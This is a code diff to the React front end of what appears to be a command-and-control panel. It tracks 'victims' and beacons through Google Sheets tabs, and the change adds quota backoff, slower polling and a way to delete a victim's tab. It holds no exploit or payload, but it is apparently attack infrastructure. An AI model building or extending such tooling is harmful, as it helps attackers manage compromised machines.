@@ -3,12 +3,23 @@ import axios from 'axios';
 
 const AppContext = createContext(null);
 
-// How often to poll while waiting for beacon response (ms)
-const POLL_INTERVAL_MS = 4000;
+// How often the UI re-reads the sheet while waiting for command output (ms)
+export const POLL_INTERVAL_MS = 10000;
 // How often to refresh the victims list (new sheet tabs / beacons)
-const VICTIMS_POLL_INTERVAL_MS = 10000;
-// Stop polling after this many attempts (e.g. 75 × 4s = 5 min)
-const MAX_POLL_ATTEMPTS = 75;
+const VICTIMS_POLL_INTERVAL_MS = 60000;
+// Pause auto-polling after Google quota errors (ms)
+const QUOTA_BACKOFF_MS = 90000;
+// Stop polling after this many attempts (e.g. 45 × 10s ≈ 7.5 min)
+const MAX_POLL_ATTEMPTS = 45;
+
+function getApiErrorMessage(e) {
+  return e?.response?.data?.error || e?.message || '';
+}
+
+function isQuotaError(e) {
+  const msg = getApiErrorMessage(e);
+  return /quota exceeded/i.test(msg) || /rate limit/i.test(msg);
+}
 
 export function AppProvider({ children }) {
   const [config, setConfig] = useState({
@@ -38,8 +49,20 @@ export function AppProvider({ children }) {
   const sleepWakeTimersRef = useRef({});
   const activeVictimRef = useRef(activeVictim);
   const victimsRef = useRef(victims);
+  const quotaPausedUntilRef = useRef(0);
   useEffect(() => { activeVictimRef.current = activeVictim; }, [activeVictim]);
   useEffect(() => { victimsRef.current = victims; }, [victims]);
+
+  const isQuotaPaused = useCallback(() => Date.now() < quotaPausedUntilRef.current, []);
+
+  const handleQuotaError = useCallback((e) => {
+    if (!isQuotaError(e)) return false;
+    quotaPausedUntilRef.current = Date.now() + QUOTA_BACKOFF_MS;
+    setError(
+      'Google Sheets read limit reached. Auto-refresh paused for 90 seconds — wait or use Refresh sparingly.',
+    );
+    return true;
+  }, []);
 
   // ── Load config from options.yml ──────────────────────────────────────────
   const fetchConfig = useCallback(async () => {
@@ -77,6 +100,7 @@ export function AppProvider({ children }) {
 
   const fetchRowsRaw = useCallback(async (victim) => {
     if (!victim || !isConfigured) return null;
+    if (isQuotaPaused()) return null;
     try {
       const res = await axios.get('/api/sheets/rows', {
         params: { sheetName: victim.title },
@@ -100,7 +124,9 @@ export function AppProvider({ children }) {
       });
       return fetched;
     } catch (e) {
-      setError(e.response?.data?.error || e.message);
+      if (!handleQuotaError(e)) {
+        setError(getApiErrorMessage(e));
+      }
       setSleepStatus((prev) => {
         const sleepEntry = victim?.id ? prev[victim.id] : null;
         if (!sleepEntry || sleepEntry.state === 'waiting') return prev;
@@ -113,36 +139,41 @@ export function AppProvider({ children }) {
       setVictimOnline(victim?.id, false);
       return null;
     }
-  }, [isConfigured, setVictimOnline]);
+  }, [isConfigured, setVictimOnline, isQuotaPaused, handleQuotaError]);
 
   const fetchRowsForVictim = useCallback(async (victim) => {
-    if (!victim || !isConfigured) return null;
+    if (!victim || !isConfigured || isQuotaPaused()) return null;
     try {
       const res = await axios.get('/api/sheets/rows', {
         params: { sheetName: victim.title },
       });
       return res.data.rows || [];
-    } catch (_) {
+    } catch (e) {
+      handleQuotaError(e);
       return null;
     }
-  }, [isConfigured]);
+  }, [isConfigured, isQuotaPaused, handleQuotaError]);
 
-  const fetchRows = useCallback(async (victim = activeVictimRef.current) => {
+  const fetchRows = useCallback(async (victim = activeVictimRef.current, { includeTicker = true } = {}) => {
     if (!victim || !isConfigured) return;
+    if (isQuotaPaused()) return;
     setLoading(true);
     try {
-      await fetchRowsRaw(victim);
-      // Also refresh ticker silently
-      try {
-        const tr = await axios.get('/api/sheets/ticker', {
-          params: { sheetName: victim.title },
-        });
-        setTicker(tr.data.ticker || 60);
-      } catch (_) {}
+      const fetched = await fetchRowsRaw(victim);
+      if (includeTicker && fetched) {
+        try {
+          const tr = await axios.get('/api/sheets/ticker', {
+            params: { sheetName: victim.title },
+          });
+          setTicker(tr.data.ticker || 60);
+        } catch (e) {
+          handleQuotaError(e);
+        }
+      }
     } finally {
       setLoading(false);
     }
-  }, [isConfigured, fetchRowsRaw]);
+  }, [isConfigured, fetchRowsRaw, isQuotaPaused, handleQuotaError]);
 
   // ── Stop any in-progress poll ─────────────────────────────────────────────
   const stopPolling = useCallback(() => {
@@ -170,6 +201,7 @@ export function AppProvider({ children }) {
 
       const victim = activeVictimRef.current;
       if (!victim) { stopPolling(); return; }
+      if (isQuotaPaused()) return;
 
       const fetched = await fetchRowsRaw(victim);
 
@@ -187,7 +219,7 @@ export function AppProvider({ children }) {
         stopPolling();
       }
     }, POLL_INTERVAL_MS);
-  }, [fetchRowsRaw, stopPolling]);
+  }, [fetchRowsRaw, stopPolling, isQuotaPaused]);
 
   const parseSleepDuration = (value) => {
     if (!value) return null;
@@ -281,6 +313,7 @@ export function AppProvider({ children }) {
   // ── Victims ───────────────────────────────────────────────────────────────
   const fetchVictims = useCallback(async ({ silent = false } = {}) => {
     if (!isConfigured) return;
+    if (silent && isQuotaPaused()) return;
     try {
       if (!silent) {
         setLoading(true);
@@ -304,11 +337,49 @@ export function AppProvider({ children }) {
         }
       }
     } catch (e) {
-      if (!silent) setError(e.response?.data?.error || e.message);
+      if (!handleQuotaError(e) && !silent) {
+        setError(getApiErrorMessage(e));
+      }
     } finally {
       if (!silent) setLoading(false);
     }
-  }, [isConfigured]);
+  }, [isConfigured, isQuotaPaused, handleQuotaError]);
+
+  const deleteVictim = useCallback(async (victim) => {
+    if (!victim || !isConfigured) return false;
+    try {
+      setError(null);
+      await axios.delete('/api/sheets/tab', {
+        data: { sheetTabId: victim.id },
+      });
+
+      const victimId = victim.id;
+      const remaining = victimsRef.current.filter((v) => v.id !== victimId);
+      setVictims(remaining);
+
+      setSleepStatus((prev) => {
+        const next = { ...prev };
+        delete next[victimId];
+        return next;
+      });
+      setVictimStatus((prev) => {
+        const next = { ...prev };
+        delete next[victimId];
+        return next;
+      });
+
+      if (String(activeVictimRef.current?.id) === String(victimId)) {
+        stopPolling();
+        setRows([]);
+        setActiveVictim(remaining.length > 0 ? remaining[remaining.length - 1] : null);
+      }
+
+      return true;
+    } catch (e) {
+      setError(e.response?.data?.error || e.message);
+      return false;
+    }
+  }, [isConfigured, stopPolling]);
 
   const updateTicker = useCallback(async (value) => {
     if (!activeVictimRef.current || !isConfigured) return;
@@ -405,7 +476,10 @@ export function AppProvider({ children }) {
   useEffect(() => {
     if (!isConfigured) return;
     fetchVictims();
-    const id = setInterval(() => fetchVictims({ silent: true }), VICTIMS_POLL_INTERVAL_MS);
+    const id = setInterval(() => {
+      if (document.hidden) return;
+      fetchVictims({ silent: true });
+    }, VICTIMS_POLL_INTERVAL_MS);
     return () => clearInterval(id);
   }, [isConfigured, fetchVictims]);
 
@@ -419,9 +493,12 @@ export function AppProvider({ children }) {
   // Auto-refresh (manual toggle)
   useEffect(() => {
     if (!autoRefresh || !activeVictim) return;
-    const id = setInterval(() => fetchRows(), ticker * 1000);
+    const id = setInterval(() => {
+      if (document.hidden || isQuotaPaused()) return;
+      fetchRows(activeVictim, { includeTicker: false });
+    }, ticker * 1000);
     return () => clearInterval(id);
-  }, [autoRefresh, ticker, activeVictim]);
+  }, [autoRefresh, ticker, activeVictim, fetchRows, isQuotaPaused]);
 
   // Cleanup poll on unmount
   useEffect(() => () => stopPolling(), []);
@@ -439,6 +516,7 @@ export function AppProvider({ children }) {
       lastRefresh,
       sendCommand,
       fetchVictims,
+      deleteVictim,
       isConfigured,
       showSettings, setShowSettings,
       sleepStatus,
@@ -446,6 +524,7 @@ export function AppProvider({ children }) {
       parseHHMMSS,
       // Polling state for UI indicator
       polling, pendingRow,
+      pollIntervalMs: POLL_INTERVAL_MS,
     }}>
       {children}
     </AppContext.Provider>
